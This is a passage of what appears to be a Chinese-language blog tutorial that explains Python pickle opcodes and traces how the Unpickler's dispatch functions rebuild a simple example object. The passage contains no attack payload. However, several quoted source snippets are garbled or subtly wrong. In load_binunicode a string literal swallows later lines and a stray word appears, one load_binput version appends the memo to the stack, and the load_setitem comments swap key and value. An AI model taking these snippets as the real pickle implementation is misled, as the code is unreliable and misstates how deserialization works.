class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b&#x27;\x80&#x27;</span>  <span class="comment"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = <span class="string">b&#x27;\x82&#x27;</span>  <span class="comment"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = <span class="string">b&#x27;\x83&#x27;</span>  <span class="comment"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = <span class="string">b&#x27;\x84&#x27;</span>  <span class="comment"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = <span class="string">b&#x27;\x85&#x27;</span>  <span class="comment"># build 1-tuple from stack top</span></span><br><span class="line">TUPLE2         = <span class="string">b&#x27;\x86&#x27;</span>  <span class="comment"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = <span class="string">b&#x27;\x87&#x27;</span>  <span class="comment"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = <span class="string">b&#x27;\x88&#x27;</span>  <span class="comment"># push True</span></span><br><span class="line">NEWFALSE       = <span class="string">b&#x27;\x89&#x27;</span>  <span class="comment"># push False</span></span><br><span class="line">LONG1          = <span class="string">b&#x27;\x8a&#x27;</span>  <span class="comment"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = <span class="string">b&#x27;\x8b&#x27;</span>  <span class="comment"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b&#x27;\x8c&#x27;</span>  <span class="comment"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = <span class="string">b&#x27;\x8d&#x27;</span>  <span class="comment"># push very long string</span></span><br><span class="line">BINBYTES8        = <span class="string">b&#x27;\x8e&#x27;</span>  <span class="comment"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = <span class="string">b&#x27;\x8f&#x27;</span>  <span class="comment"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = <span class="string">b&#x27;\x90&#x27;</span>  <span class="comment"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = <span class="string">b&#x27;\x91&#x27;</span>  <span class="comment"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b&#x27;\x92&#x27;</span>  <span class="comment"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b&#x27;\x93&#x27;</span>  <span class="comment"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = <span class="string">b&#x27;\x94&#x27;</span>  <span class="comment"># store top of the stack in memo</span></span><br><span class="line">FRAME            = <span class="string">b&#x27;\x95&#x27;</span>  <span class="comment"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = <span class="string">b&#x27;\x96&#x27;</span>  <span class="comment"># push bytearray</span></span><br><span class="line">NEXT_BUFFER      = <span class="string">b&#x27;\x97&#x27;</span>  <span class="comment"># push next out-of-band buffer</span></span><br><span class="line">READONLY_BUFFER  = <span class="string">b&#x27;\x98&#x27;</span>  <span class="comment"># make top of stack readonly</span></span><br></pre></td></tr></table></figure>

<h2 id="opcode源码分析"><a href="#opcode源码分析" class="headerlink" title="opcode源码分析"></a>opcode源码分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.people = <span class="string">&#x27;lituer&#x27;</span></span><br><span class="line">a = test()</span><br><span class="line">serialized = pickle.dumps(a, protocol=<span class="number">3</span>)  <span class="comment"># 指定PVM 协议版本</span></span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line"></span><br><span class="line">unserialized = pickle.loads(serialized)  <span class="comment"># 注意，loads 能够自动识别反序列化的版本</span></span><br><span class="line"><span class="built_in">print</span>(unserialized.people)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;\x80\x03c__main__\ntest\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00peopleq\x03X\x06\x00\x00\x00lituerq\x04sb.&#x27;</span><br></pre></td></tr></table></figure>

<p>下面分析一整段opcode码的作用</p>
<p><code>\x80\x03</code></p>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_proto</span>(<span class="params">self</span>):</span><br><span class="line">       proto = self.read(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">       <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &amp;lt;= proto &amp;lt;= HIGHEST_PROTOCOL:</span><br><span class="line">           <span class="keyword">raise</span> ValueError(<span class="string">&quot;unsupported pickle protocol: %d&quot;</span> % proto)</span><br><span class="line">       self.proto = proto</span><br><span class="line">   dispatch[PROTO[<span class="number">0</span>]] = load_proto</span><br></pre></td></tr></table></figure>

<p>代码首先从输入流中读取一个字节并将其存储在 <code>proto</code> 变量中。然后，它检查该变量的值是否在合法的 pickle 协议范围内，如果不是，则引发一个 <code>ValueError</code> 异常，指示不支持的协议。最后，它将 <code>proto</code> 变量的值存储在对象的 <code>proto</code> 属性中，这两个字节就是判断版本号的；</p>
<p><code>c</code></p>
<p>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）会加入self.stack</p>
<p>源代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_global</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment">#往后读到换行符作为模块名 __main__</span></span><br><span class="line">    module = self.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#往后读到换行符作为类名 animal</span></span><br><span class="line">    name = self.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#进入find_class</span></span><br><span class="line">    klass = self.find_class(module, name)</span><br><span class="line">    self.append(klass)<span class="comment">#获取模块后添加到当前栈中</span></span><br><span class="line">dispatch[GLOBAL[<span class="number">0</span>]] = load_global</span><br></pre></td></tr></table></figure>

<p>find_class()函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">    <span class="comment"># 在系统审核日志中记录“pickle.find_class”事件，包括模块名和对象名</span></span><br><span class="line">    sys.audit(<span class="string">&#x27;pickle.find_class&#x27;</span>, module, name)</span><br><span class="line">    <span class="comment"># 如果协议版本小于3且开启了fix_imports标志，则进行特殊的名称和模块映射处理</span></span><br><span class="line">    <span class="keyword">if</span> self.proto &lt; <span class="number">3</span> <span class="keyword">and</span> self.fix_imports:</span><br><span class="line">        <span class="comment"># 如果(module, name)在NAME_MAPPING中，则使用映射的名称代替原名称</span></span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="comment"># 如果module在IMPORT_MAPPING中，则使用映射的模块名代替原模块名</span></span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    <span class="comment"># 动态加载指定模块</span></span><br><span class="line">    <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 如果协议版本大于等于4，则使用_getattribute方法获取对象</span></span><br><span class="line">    <span class="keyword">if</span> self.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 否则，使用getattr方法获取对象</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure>

<p>然后<code>self.append(klass)</code>添加到当前栈中,所以当前栈中有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self=&amp;gt; stack:[类]</span><br></pre></td></tr></table></figure>

<p><code>q</code></p>
<p>对应源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_binput</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># 从输入流中读取一个字节作为索引，表示待保存对象在memo字典中的位置</span></span><br><span class="line">    i = self.read(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 如果读取到的索引小于0，则引发ValueError异常</span></span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;negative BINPUT argument&quot;</span>)</span><br><span class="line">    <span class="comment"># 将当前堆栈顶部的对象保存到memo字典中，使用读取到的索引作为键值</span></span><br><span class="line">    self.memo[i] = self.stack[-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 将memo字典添加到堆栈中</span></span><br><span class="line">    self.append(self.memo)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将load_binput函数注册到pickle库的分发表中，以便在序列化时调用</span></span><br><span class="line">dispatch[BINPUT[<span class="number">0</span>]] = load_binput</span><br></pre></td></tr></table></figure>

<p>所以记忆栈中<strong>存在了test类</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memo=&amp;gt; stack:[类]</span><br></pre></td></tr></table></figure>

<p><code>)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_empty_tuple</span>(<span class="params">self</span>):</span><br><span class="line">       self.append(())<span class="comment">#向当前栈中增加一个新的元组</span></span><br><span class="line">   dispatch[EMPTY_TUPLE[<span class="number">0</span>]] = load_empty_tuple</span><br></pre></td></tr></table></figure>

<p>操作完之后栈区就变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self=&amp;gt; stack:[类，()]</span><br></pre></td></tr></table></figure>

<p><code>\x81</code></p>
<p>弹出self栈中的两个元素 然后把参数传入<code>__new__</code>对类进行实例化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_newobj</span>(<span class="params">self</span>):</span><br><span class="line">    args = self.stack.pop() <span class="comment"># 空元组()</span></span><br><span class="line">    cls = self.stack.pop() <span class="comment"># </span></span><br><span class="line">    obj = cls.__new__(cls, *args) </span><br><span class="line">    <span class="comment">#__new__方法的作用是修改不可变类(int,String)等基本类都是不可变类，此处不需修改，所以传入元组</span></span><br><span class="line">    self.append(obj) <span class="comment">#将实例化的test给self这个self栈中</span></span><br><span class="line">dispatch[NEWOBJ[<span class="number">0</span>]] = load_newobj</span><br></pre></td></tr></table></figure>

<p>这时的self栈区</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self=&amp;gt; stack:[(对象)]</span><br></pre></td></tr></table></figure>

<p><code>q</code></p>
<p>把self中的对象压入memo栈中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_binput</span>(<span class="params">self</span>):</span><br><span class="line">    i = self.read(<span class="number">1</span>)[<span class="number">0</span>]<span class="comment">#继续读取下一个字节，赋值给i</span></span><br><span class="line">    <span class="keyword">if</span> i &amp;lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;negative BINPUT argument&quot;</span>)</span><br><span class="line">    self.memo[i] = self.stack[-<span class="number">1</span>]<span class="comment">#将栈中的栈尾(与栈顶相对)存入记忆栈中memo</span></span><br><span class="line">dispatch[BINPUT[<span class="number">0</span>]] = load_binput</span><br></pre></td></tr></table></figure>

<p>当前的memo栈有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memo=&amp;gt; stack:[(类) , (对象)]</span><br></pre></td></tr></table></figure>

<p><code>&#125;</code></p>
<p>向栈区压入一个空字典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_empty_dictionary</span>(<span class="params">self</span>):</span><br><span class="line">    self.append(&#123;&#125;) </span><br><span class="line">dispatch[EMPTY_DICT[<span class="number">0</span>]] = load_empty_dictionary</span><br></pre></td></tr></table></figure>

<p>当前self栈</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self=&amp;gt; stack:[(对象)，&#123;&#125;]</span><br></pre></td></tr></table></figure>

<p><code>q</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_binput</span>(<span class="params">self</span>):</span><br><span class="line">       i = self.read(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">       <span class="keyword">if</span> i &amp;lt; <span class="number">0</span>:</span><br><span class="line">           <span class="keyword">raise</span> ValueError(<span class="string">&quot;negative BINPUT argument&quot;</span>)</span><br><span class="line">       self.memo[i] = self.stack[-<span class="number">1</span>]<span class="comment">#将栈中的栈尾栈顶存入记忆栈中memo</span></span><br><span class="line">   dispatch[BINPUT[<span class="number">0</span>]] = load_binput</span><br></pre></td></tr></table></figure>

<p>当前memo栈</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memo=&amp;gt; stack:[(类) , (对象),&#123;&#125;]</span><br></pre></td></tr></table></figure>

<p><code>X</code></p>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_binunicode</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">len</span>, = unpack(<span class="string">&#x27;&lt;i&gt;6  </span></span><br><span class="line"><span class="string">    if len &amp;gt; maxsize:  #这里的6也就是后面的x06也就是属性名字符串的长度</span></span><br><span class="line"><span class="string">        raise UnpicklingError(&quot;BINUNICODE exceeds system&#x27;</span>s maximum size <span class="string">&quot;</span></span><br><span class="line"><span class="string">                              &quot;</span>of %d <span class="built_in">bytes</span><span class="string">&quot; % maxsize)</span></span><br><span class="line"><span class="string">    self.append(str(self.read(len), &#x27;utf-8&#x27;, &#x27;surrogatepass&#x27;))</span></span><br><span class="line"><span class="string">    #再往后读len长度的字节数 people（属性名） 然后存入到栈中中</span></span><br><span class="line"><span class="string">dispatch[BINUNICODE[0]] = load_binunicode</span></span><br></pre></td></tr></table></figure>

<p>所以self栈中就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self=&amp;gt; stack:[(对象),&#123;&#125;,&quot;people&quot;]</span><br></pre></td></tr></table></figure>

<p><code>q</code></p>
<p>和上面的思路一样，不多赘述了</p>
<p>此时的memo栈中的内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memo=&amp;gt; stack:[(类) , (对象),&#123;&#125;,&quot;people&quot;]</span><br></pre></td></tr></table></figure>

<p><code>X</code></p>
<p>读取后面的\x03识别长度为三的字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_binunicode</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">len</span>, = unpack(<span class="string">&#x27;&lt;i&gt; 3  </span></span><br><span class="line"><span class="string">    if len &amp;gt; maxsize: #读取后面的\x03识别长度为三的字符串</span></span><br><span class="line"><span class="string">        raise UnpicklingError(&quot;BINUNICODE exceeds system&#x27;</span>s maximum size <span class="string">&quot;</span></span><br><span class="line"><span class="string">                              &quot;</span>of %d <span class="built_in">bytes</span><span class="string">&quot; % maxsize)</span></span><br><span class="line"><span class="string">    self.append(str(self.read(len), &#x27;utf-8&#x27;, &#x27;surrogatepass&#x27;)) dog</span></span><br><span class="line"><span class="string">    #再往后读len长度的字节数 lituer（属性值） 然后存入到栈中中</span></span><br><span class="line"><span class="string">dispatch[BINUNICODE[0]] = load_binunicode</span></span><br></pre></td></tr></table></figure>

<p>此时self栈中的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self=&amp;gt; stack:[(对象),&#123;&#125;,<span class="string">&quot;people&quot;</span>,<span class="string">&quot;lituer&quot;</span>]</span><br></pre></td></tr></table></figure>

<p><code>q</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_binput</span>(<span class="params">self</span>):</span><br><span class="line">        i = self.read(<span class="number">1</span>)[<span class="number">0</span>]<span class="comment">#继续读取下一个字节 \x04 ，赋值给i</span></span><br><span class="line">        <span class="keyword">if</span> i &amp;lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;negative BINPUT argument&quot;</span>)</span><br><span class="line">        self.memo[i] = self.stack[-<span class="number">1</span>]</span><br><span class="line">    dispatch[BINPUT[<span class="number">0</span>]] = load_binput</span><br></pre></td></tr></table></figure>

<p>当前memo的栈中的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memo=&amp;gt; stack:[(类) , (对象),&#123;&#125;,<span class="string">&quot;people&quot;</span>,<span class="string">&quot;lituer&quot;</span>]</span><br></pre></td></tr></table></figure>

<p><code>s</code></p>
<p>将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中</p>
<p>对应源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">def</span> <span class="title function_">load_setitem</span>(<span class="params">self</span>):</span><br><span class="line">        stack = self.stack</span><br><span class="line">        value = stack.pop()  <span class="comment">#&quot;people&quot;</span></span><br><span class="line">        key = stack.pop()   <span class="comment">#&quot;lituer&quot;</span></span><br><span class="line">       <span class="comment">#弹出这两个对象</span></span><br><span class="line">        <span class="built_in">dict</span> = stack[-<span class="number">1</span>]    <span class="comment">#栈顶&#123;&#125;</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="built_in">dict</span>[key] = value   <span class="comment">#&#123;&quot;people&quot;:&quot;lituer&quot;&#125;</span></span><br><span class="line">    dispatch[SETITEM[<span class="number">0</span>]] = load_setitem</span><br><span class="line">self=&amp;gt; stack:[(对象),&#123;<span class="string">&quot;people&quot;</span>:<span class="string">&quot;lituer&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p><code>b</code></p>
<p>使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 <strong>setstate</strong> 或 <strong>dict</strong>.update()</p>
<p>源码</p>
